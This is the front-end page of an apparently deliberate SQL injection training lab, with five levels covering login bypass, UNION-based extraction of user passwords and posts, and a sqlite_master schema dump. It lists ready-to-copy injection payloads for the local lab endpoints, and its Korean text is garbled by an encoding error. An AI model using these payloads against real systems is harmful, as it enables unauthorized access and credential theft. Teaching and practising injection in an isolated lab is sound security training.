<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection ë‹¨ê³„ë³„ í•™ìŠµ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }

        .header p {
            font-size: 1.1em;
            opacity: 0.9;
        }

        .levels-container {
            display: grid;
            grid-template-columns: 300px 1fr;
            min-height: 600px;
        }

        .sidebar {
            background: #f8f9fa;
            padding: 20px;
            border-right: 1px solid #dee2e6;
        }

        .level-item {
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }

        .level-item:hover {
            background: #e9ecef;
        }

        .level-item.active {
            background: #007bff;
            color: white;
            border-color: #0056b3;
        }

        .level-item.completed {
            background: #28a745;
            color: white;
            border-color: #1e7e34;
        }

        .main-content {
            padding: 30px;
        }

        .level-info {
            margin-bottom: 30px;
        }

        .level-info h2 {
            color: #333;
            margin-bottom: 15px;
            font-size: 1.8em;
        }

        .level-info p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .hint-box {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }

        .hint-box h4 {
            color: #856404;
            margin-bottom: 10px;
        }

        .input-section {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }

        .input-group input:focus {
            outline: none;
            border-color: #007bff;
        }

        .btn {
            background: #007bff;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            transition: background 0.3s ease;
        }

        .btn:hover {
            background: #0056b3;
        }

        .btn-success {
            background: #28a745;
        }

        .btn-success:hover {
            background: #1e7e34;
        }

        .results {
            background: white;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
        }

        .results h3 {
            color: #333;
            margin-bottom: 15px;
        }

        .result-item {
            background: #f8f9fa;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 5px;
            border-left: 4px solid #007bff;
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            border: 1px solid #c3e6cb;
        }

        .error-message {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            border: 1px solid #f5c6cb;
        }

        .payload-examples {
            background: #e9ecef;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
        }

        .payload-examples h4 {
            margin-bottom: 10px;
            color: #495057;
        }

        .payload-example {
            background: white;
            padding: 8px 12px;
            margin: 5px 0;
            border-radius: 4px;
            font-family: monospace;
            cursor: pointer;
            border: 1px solid #dee2e6;
        }

        .payload-example:hover {
            background: #f8f9fa;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e9ecef;
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #28a745, #20c997);
            transition: width 0.3s ease;
        }
    </style>
</head>
<body>
    <a href="/" class="back-btn" style="position: fixed; top: 20px; left: 20px; background: rgba(0,0,0,0.7); color: white; border: none; padding: 10px 15px; border-radius: 5px; cursor: pointer; text-decoration: none; font-size: 14px; z-index: 1000;">â† ë©”ì¸ìœ¼ë¡œ</a>

    <div class="container">
        <div class="header">
            <h1>ğŸ”“ SQL Injection ë‹¨ê³„ë³„ í•™ìŠµ</h1>
            <p>ì˜ë„ì ìœ¼ë¡œ ì·¨ì•½í•œ í™˜ê²½ì—ì„œ SQL Injectionì„ ì•ˆì „í•˜ê²Œ í•™ìŠµí•˜ì„¸ìš”</p>
        </div>

        <div class="levels-container">
            <div class="sidebar">
                <h3 style="margin-bottom: 20px; color: #333;">ğŸ“š í•™ìŠµ ë‹¨ê³„</h3>
                <div class="level-item active" data-level="1">
                    <strong>Level 1:</strong> ê¸°ë³¸ ì¸ì¦ ìš°íšŒ
                </div>
                <div class="level-item" data-level="2">
                    <strong>Level 2:</strong> ë°ì´í„° ì¶”ì¶œ
                </div>
                <div class="level-item" data-level="3">
                    <strong>Level 3:</strong> UNION ê³µê²©
                </div>
                <div class="level-item" data-level="4">
                    <strong>Level 4:</strong> ê³ ê¸‰ ë°ì´í„° ì¶”ì¶œ
                </div>
                <div class="level-item" data-level="5">
                    <strong>Level 5:</strong> ë°ì´í„°ë² ì´ìŠ¤ ì •ë³´ ìˆ˜ì§‘
                </div>
                
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill" style="width: 20%;"></div>
                </div>
                <p style="text-align: center; color: #666; font-size: 0.9em;">
                    ì§„í–‰ë¥ : <span id="progressText">1/5</span>
                </p>
            </div>

            <div class="main-content">
                <div class="level-info">
                    <h2 id="levelTitle">Level 1: ê¸°ë³¸ ì¸ì¦ ìš°íšŒ</h2>
                    <p id="levelDescription">
                        ì²« ë²ˆì§¸ ë‹¨ê³„ì—ì„œëŠ” ê¸°ë³¸ì ì¸ SQL Injectionì„ í†µí•´ ë¡œê·¸ì¸ ì¸ì¦ì„ ìš°íšŒí•´ë³´ê² ìŠµë‹ˆë‹¤.
                        ì‚¬ìš©ìëª…ê³¼ ë¹„ë°€ë²ˆí˜¸ ì…ë ¥ í•„ë“œì— SQL Injection í˜ì´ë¡œë“œë¥¼ ì…ë ¥í•˜ì—¬ ê´€ë¦¬ì ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸í•´ë³´ì„¸ìš”.
                    </p>
                    
                    <div class="hint-box">
                        <h4>ğŸ’¡ íŒíŠ¸</h4>
                        <p id="levelHint">
                            ì‚¬ìš©ìëª… í•„ë“œì— <code>' OR '1'='1</code> ë˜ëŠ” <code>' OR 1=1 --</code>ë¥¼ ì…ë ¥í•´ë³´ì„¸ìš”.
                            ì´ëŠ” WHERE ì ˆì„ í•­ìƒ ì°¸ìœ¼ë¡œ ë§Œë“¤ì–´ ëª¨ë“  ì‚¬ìš©ìë¥¼ ë°˜í™˜í•˜ê²Œ í•©ë‹ˆë‹¤.
                        </p>
                    </div>
                </div>

                <div class="input-section">
                    <div class="input-group">
                        <label for="username">ì‚¬ìš©ìëª…:</label>
                        <input type="text" id="username" placeholder="ì‚¬ìš©ìëª…ì„ ì…ë ¥í•˜ì„¸ìš”">
                    </div>
                    <div class="input-group">
                        <label for="password">ë¹„ë°€ë²ˆí˜¸:</label>
                        <input type="text" id="password" placeholder="ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ì„¸ìš”">
                    </div>
                    <button class="btn" onclick="attemptLogin()">ë¡œê·¸ì¸ ì‹œë„</button>
                </div>

                <div class="payload-examples">
                    <h4>ğŸ¯ í˜ì´ë¡œë“œ ì˜ˆì‹œ (í´ë¦­í•˜ì—¬ ë³µì‚¬)</h4>
                    <div class="payload-example" onclick="copyPayload(this)">' OR '1'='1</div>
                    <div class="payload-example" onclick="copyPayload(this)">' OR 1=1 --</div>
                    <div class="payload-example" onclick="copyPayload(this)">admin' --</div>
                    <div class="payload-example" onclick="copyPayload(this)">' UNION SELECT * FROM users --</div>
                </div>

                <div id="results" class="results" style="display: none;">
                    <h3>ğŸ“Š ê²°ê³¼</h3>
                    <div id="resultContent"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentLevel = 1;
        let completedLevels = new Set();

        const levels = {
            1: {
                title: "Level 1: ê¸°ë³¸ ì¸ì¦ ìš°íšŒ",
                description: "ì²« ë²ˆì§¸ ë‹¨ê³„ì—ì„œëŠ” ê¸°ë³¸ì ì¸ SQL Injectionì„ í†µí•´ ë¡œê·¸ì¸ ì¸ì¦ì„ ìš°íšŒí•´ë³´ê² ìŠµë‹ˆë‹¤. ì‚¬ìš©ìëª…ê³¼ ë¹„ë°€ë²ˆí˜¸ ì…ë ¥ í•„ë“œì— SQL Injection í˜ì´ë¡œë“œë¥¼ ì…ë ¥í•˜ì—¬ ê´€ë¦¬ì ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸í•´ë³´ì„¸ìš”.",
                hint: "ì‚¬ìš©ìëª… í•„ë“œì— <code>' OR '1'='1</code> ë˜ëŠ” <code>' OR 1=1 --</code>ë¥¼ ì…ë ¥í•´ë³´ì„¸ìš”. ì´ëŠ” WHERE ì ˆì„ í•­ìƒ ì°¸ìœ¼ë¡œ ë§Œë“¤ì–´ ëª¨ë“  ì‚¬ìš©ìë¥¼ ë°˜í™˜í•˜ê²Œ í•©ë‹ˆë‹¤.",
                inputType: "login",
                payloads: ["' OR '1'='1", "' OR 1=1 --", "admin' --", "' OR '1'='1' --"]
            },
            2: {
                title: "Level 2: ë°ì´í„° ì¶”ì¶œ",
                description: "ì´ë²ˆ ë‹¨ê³„ì—ì„œëŠ” SQL Injectionì„ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ì‚¬ìš©ì ì •ë³´ë¥¼ ì¶”ì¶œí•´ë³´ê² ìŠµë‹ˆë‹¤. ê²€ìƒ‰ ê¸°ëŠ¥ì„ í†µí•´ ëª¨ë“  ì‚¬ìš©ìì˜ ì •ë³´ë¥¼ ì°¾ì•„ë³´ì„¸ìš”.",
                hint: "ê²€ìƒ‰ì–´ì— <code>' UNION SELECT username, password, email FROM users --</code>ë¥¼ ì…ë ¥í•´ë³´ì„¸ìš”. UNIONì„ ì‚¬ìš©í•˜ì—¬ ì›ë˜ ì¿¼ë¦¬ì™€ ë‹¤ë¥¸ ê²°ê³¼ë¥¼ ê²°í•©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.",
                inputType: "search",
                payloads: ["' UNION SELECT username, password, email FROM users --", "' UNION SELECT * FROM users --", "' OR 1=1 UNION SELECT username, password, email FROM users --"]
            },
            3: {
                title: "Level 3: UNION ê³µê²©",
                description: "UNION ê³µê²©ì„ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì˜ ë‹¤ë¥¸ í…Œì´ë¸”ì—ì„œ ì •ë³´ë¥¼ ì¶”ì¶œí•´ë³´ê² ìŠµë‹ˆë‹¤. ê²Œì‹œê¸€ í…Œì´ë¸”ì˜ ì •ë³´ë¥¼ ê°€ì ¸ì™€ë³´ì„¸ìš”.",
                hint: "ê²€ìƒ‰ì–´ì— <code>' UNION SELECT title, content, author FROM posts --</code>ë¥¼ ì…ë ¥í•´ë³´ì„¸ìš”. ë‹¤ë¥¸ í…Œì´ë¸”ì˜ ë°ì´í„°ë¥¼ ì¡°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.",
                inputType: "search",
                payloads: ["' UNION SELECT title, content, author FROM posts --", "' UNION SELECT * FROM posts --", "' OR 1=1 UNION SELECT title, content, author FROM posts --"]
            },
            4: {
                title: "Level 4: ê³ ê¸‰ ë°ì´í„° ì¶”ì¶œ",
                description: "ë” ë³µì¡í•œ SQL Injectionì„ í†µí•´ íŠ¹ì • ì¡°ê±´ì— ë§ëŠ” ë°ì´í„°ë¥¼ ì¶”ì¶œí•´ë³´ê² ìŠµë‹ˆë‹¤. ê´€ë¦¬ì ê³„ì •ë§Œ ì°¾ì•„ë³´ì„¸ìš”.",
                hint: "ê²€ìƒ‰ì–´ì— <code>' UNION SELECT id, username, password, email FROM users WHERE username LIKE '%admin%' --</code>ë¥¼ ì…ë ¥í•´ë³´ì„¸ìš”. WHERE ì ˆì„ ì‚¬ìš©í•˜ì—¬ íŠ¹ì • ì¡°ê±´ì˜ ë°ì´í„°ë§Œ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.",
                inputType: "search",
                payloads: ["' UNION SELECT id, username, password, email FROM users WHERE username LIKE '%admin%' --", "' UNION SELECT * FROM users WHERE username LIKE '%admin%' --"]
            },
            5: {
                title: "Level 5: ë°ì´í„°ë² ì´ìŠ¤ ì •ë³´ ìˆ˜ì§‘",
                description: "ë§ˆì§€ë§‰ ë‹¨ê³„ì—ì„œëŠ” ë°ì´í„°ë² ì´ìŠ¤ì˜ ë©”íƒ€ë°ì´í„°ë¥¼ ìˆ˜ì§‘í•´ë³´ê² ìŠµë‹ˆë‹¤. ì‹œìŠ¤í…œ í…Œì´ë¸”ì„ ì¡°íšŒí•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ êµ¬ì¡°ë¥¼ íŒŒì•…í•´ë³´ì„¸ìš”.",
                hint: "ê²€ìƒ‰ì–´ì— <code>' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --</code>ë¥¼ ì…ë ¥í•´ë³´ì„¸ìš”. sqlite_master í…Œì´ë¸”ì€ ë°ì´í„°ë² ì´ìŠ¤ì˜ ìŠ¤í‚¤ë§ˆ ì •ë³´ë¥¼ ë‹´ê³  ìˆìŠµë‹ˆë‹¤.",
                inputType: "search",
                payloads: ["' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --", "' UNION SELECT * FROM sqlite_master --", "' OR 1=1 UNION SELECT name, sql FROM sqlite_master WHERE type='table' --"]
            }
        };

        function loadLevel(level) {
            currentLevel = level;
            const levelData = levels[level];
            
            document.getElementById('levelTitle').innerHTML = levelData.title;
            document.getElementById('levelDescription').innerHTML = levelData.description;
            document.getElementById('levelHint').innerHTML = levelData.hint;
            
            // ì…ë ¥ í•„ë“œ ì—…ë°ì´íŠ¸
            updateInputFields(levelData.inputType);
            
            // í˜ì´ë¡œë“œ ì˜ˆì‹œ ì—…ë°ì´íŠ¸
            updatePayloadExamples(levelData.payloads);
            
            // UI ì—…ë°ì´íŠ¸
            document.querySelectorAll('.level-item').forEach(item => {
                item.classList.remove('active');
                if (parseInt(item.dataset.level) === level) {
                    item.classList.add('active');
                }
            });
            
            updateProgress();
            hideResults();
        }

        function updateInputFields(inputType) {
            const inputSection = document.querySelector('.input-section');
            
            if (inputType === 'login') {
                inputSection.innerHTML = `
                    <div class="input-group">
                        <label for="username">ì‚¬ìš©ìëª…:</label>
                        <input type="text" id="username" placeholder="ì‚¬ìš©ìëª…ì„ ì…ë ¥í•˜ì„¸ìš”">
                    </div>
                    <div class="input-group">
                        <label for="password">ë¹„ë°€ë²ˆí˜¸:</label>
                        <input type="text" id="password" placeholder="ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ì„¸ìš”">
                    </div>
                    <button class="btn" onclick="attemptLogin()">ë¡œê·¸ì¸ ì‹œë„</button>
                `;
            } else if (inputType === 'search') {
                inputSection.innerHTML = `
                    <div class="input-group">
                        <label for="searchQuery">ê²€ìƒ‰ì–´:</label>
                        <input type="text" id="searchQuery" placeholder="ê²€ìƒ‰ì–´ë¥¼ ì…ë ¥í•˜ì„¸ìš”">
                    </div>
                    <button class="btn" onclick="attemptSearch()">ê²€ìƒ‰</button>
                `;
            }
            
            // ì´ë²¤íŠ¸ ë¦¬ìŠ¤ë„ˆ ë‹¤ì‹œ ì¶”ê°€
            addEventListeners();
        }

        function updatePayloadExamples(payloads) {
            const payloadContainer = document.querySelector('.payload-examples');
            let payloadHTML = '<h4>ğŸ¯ í˜ì´ë¡œë“œ ì˜ˆì‹œ (í´ë¦­í•˜ì—¬ ë³µì‚¬)</h4>';
            
            payloads.forEach(payload => {
                payloadHTML += `<div class="payload-example" onclick="copyPayload(this)">${payload}</div>`;
            });
            
            payloadContainer.innerHTML = payloadHTML;
        }

        function addEventListeners() {
            // Enter í‚¤ ì´ë²¤íŠ¸
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const searchInput = document.getElementById('searchQuery');
            
            if (usernameInput) {
                usernameInput.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        attemptLogin();
                    }
                });
            }
            
            if (passwordInput) {
                passwordInput.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        attemptLogin();
                    }
                });
            }
            
            if (searchInput) {
                searchInput.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        attemptSearch();
                    }
                });
            }
        }

        function attemptLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (currentLevel === 1) {
                // Level 1: ì‹¤ì œ ì„œë²„ API í˜¸ì¶œ
                fetch('/sql-level1/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username, password })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        showSuccess("ğŸ‰ ì„±ê³µ! SQL Injectionì„ í†µí•´ ì¸ì¦ì„ ìš°íšŒí–ˆìŠµë‹ˆë‹¤!", 
                                  `ì‚¬ìš©ìëª…: ${username}<br>ë¹„ë°€ë²ˆí˜¸: ${password}<br><br><strong>ì‹¤í–‰ëœ SQL:</strong><br><code>${data.sql}</code>`);
                        completeLevel(1);
                    } else {
                        showError(`âŒ ì‹¤íŒ¨! ì˜¬ë°”ë¥¸ SQL Injection í˜ì´ë¡œë“œë¥¼ ì‚¬ìš©í•´ë³´ì„¸ìš”.<br><br><strong>ì‹¤í–‰ëœ SQL:</strong><br><code>${data.sql}</code>`);
                    }
                })
                .catch(error => {
                    showError("âŒ ì˜¤ë¥˜ê°€ ë°œìƒí–ˆìŠµë‹ˆë‹¤: " + error.message);
                });
            } else {
                // ë‹¤ë¥¸ ë ˆë²¨ë“¤ì€ ê²€ìƒ‰ ê¸°ëŠ¥ ì‚¬ìš©
                attemptSearch(username);
            }
        }

        function attemptSearch(query) {
            if (!query.trim()) {
                showError("âŒ ê²€ìƒ‰ì–´ë¥¼ ì…ë ¥í•´ì£¼ì„¸ìš”.");
                return;
            }

            // ì‹¤ì œ ì„œë²„ API í˜¸ì¶œ
            const endpoint = `/sql-level${currentLevel}/search?q=${encodeURIComponent(query)}`;
            
            fetch(endpoint)
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    let resultData = "";
                    
                    if (data.results && data.results.length > 0) {
                        data.results.forEach(result => {
                            resultData += '<div class="result-item">';
                            Object.keys(result).forEach(key => {
                                resultData += `<strong>${key}:</strong> ${result[key]}<br>`;
                            });
                            resultData += '</div>';
                        });
                    } else {
                        resultData = '<div class="result-item">ê²€ìƒ‰ ê²°ê³¼ê°€ ì—†ìŠµë‹ˆë‹¤.</div>';
                    }
                    
                    showSuccess(`ğŸ‰ ì„±ê³µ! Level ${currentLevel}ì„ ì™„ë£Œí–ˆìŠµë‹ˆë‹¤!`, 
                              `<strong>ì‹¤í–‰ëœ SQL:</strong><br><code>${data.sql}</code><br><br><strong>ê²°ê³¼:</strong>${resultData}`);
                    completeLevel(currentLevel);
                } else {
                    showError(`âŒ ì‹¤íŒ¨! ì˜¬ë°”ë¥¸ SQL Injection í˜ì´ë¡œë“œë¥¼ ì‚¬ìš©í•´ë³´ì„¸ìš”.<br><br><strong>ì‹¤í–‰ëœ SQL:</strong><br><code>${data.sql}</code>`);
                }
            })
            .catch(error => {
                showError("âŒ ì˜¤ë¥˜ê°€ ë°œìƒí–ˆìŠµë‹ˆë‹¤: " + error.message);
            });
        }

        function attemptSearch() {
            const searchQuery = document.getElementById('searchQuery').value;
            if (!searchQuery.trim()) {
                showError("âŒ ê²€ìƒ‰ì–´ë¥¼ ì…ë ¥í•´ì£¼ì„¸ìš”.");
                return;
            }

            // ì‹¤ì œ ì„œë²„ API í˜¸ì¶œ
            const endpoint = `/sql-level${currentLevel}/search?q=${encodeURIComponent(searchQuery)}`;
            
            fetch(endpoint)
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    let resultData = "";
                    
                    if (data.results && data.results.length > 0) {
                        data.results.forEach(result => {
                            resultData += '<div class="result-item">';
                            Object.keys(result).forEach(key => {
                                resultData += `<strong>${key}:</strong> ${result[key]}<br>`;
                            });
                            resultData += '</div>';
                        });
                    } else {
                        resultData = '<div class="result-item">ê²€ìƒ‰ ê²°ê³¼ê°€ ì—†ìŠµë‹ˆë‹¤.</div>';
                    }
                    
                    showSuccess(`ğŸ‰ ì„±ê³µ! Level ${currentLevel}ì„ ì™„ë£Œí–ˆìŠµë‹ˆë‹¤!`, 
                              `<strong>ì‹¤í–‰ëœ SQL:</strong><br><code>${data.sql}</code><br><br><strong>ê²°ê³¼:</strong>${resultData}`);
                    completeLevel(currentLevel);
                } else {
                    showError(`âŒ ì‹¤íŒ¨! ì˜¬ë°”ë¥¸ SQL Injection í˜ì´ë¡œë“œë¥¼ ì‚¬ìš©í•´ë³´ì„¸ìš”.<br><br><strong>ì‹¤í–‰ëœ SQL:</strong><br><code>${data.sql}</code>`);
                }
            })
            .catch(error => {
                showError("âŒ ì˜¤ë¥˜ê°€ ë°œìƒí–ˆìŠµë‹ˆë‹¤: " + error.message);
            });
        }

        function completeLevel(level) {
            completedLevels.add(level);
            updateProgress();
            
            // ë‹¤ìŒ ë ˆë²¨ë¡œ ìë™ ì´ë™
            if (level < 5) {
                setTimeout(() => {
                    loadLevel(level + 1);
                }, 2000);
            }
        }

        function updateProgress() {
            const progress = (completedLevels.size / 5) * 100;
            document.getElementById('progressFill').style.width = progress + '%';
            document.getElementById('progressText').textContent = `${completedLevels.size}/5`;
            
            // ì™„ë£Œëœ ë ˆë²¨ í‘œì‹œ
            document.querySelectorAll('.level-item').forEach(item => {
                const level = parseInt(item.dataset.level);
                item.classList.remove('completed');
                if (completedLevels.has(level)) {
                    item.classList.add('completed');
                }
            });
        }

        function showSuccess(title, message) {
            const resultsDiv = document.getElementById('results');
            const resultContent = document.getElementById('resultContent');
            
            resultContent.innerHTML = `
                <div class="success-message">
                    <h4>${title}</h4>
                    <p>${message}</p>
                </div>
            `;
            
            resultsDiv.style.display = 'block';
        }

        function showError(message) {
            const resultsDiv = document.getElementById('results');
            const resultContent = document.getElementById('resultContent');
            
            resultContent.innerHTML = `
                <div class="error-message">
                    <h4>${message}</h4>
                </div>
            `;
            
            resultsDiv.style.display = 'block';
        }

        function hideResults() {
            document.getElementById('results').style.display = 'none';
        }

        function copyPayload(element) {
            const text = element.textContent;
            navigator.clipboard.writeText(text).then(() => {
                element.style.background = '#28a745';
                element.style.color = 'white';
                setTimeout(() => {
                    element.style.background = 'white';
                    element.style.color = 'black';
                }, 500);
            });
        }

        // ë ˆë²¨ í´ë¦­ ì´ë²¤íŠ¸
        document.querySelectorAll('.level-item').forEach(item => {
            item.addEventListener('click', () => {
                const level = parseInt(item.dataset.level);
                loadLevel(level);
            });
        });

        // ì´ˆê¸° ë¡œë“œ
        loadLevel(1);
    </script>
</body>
</html>
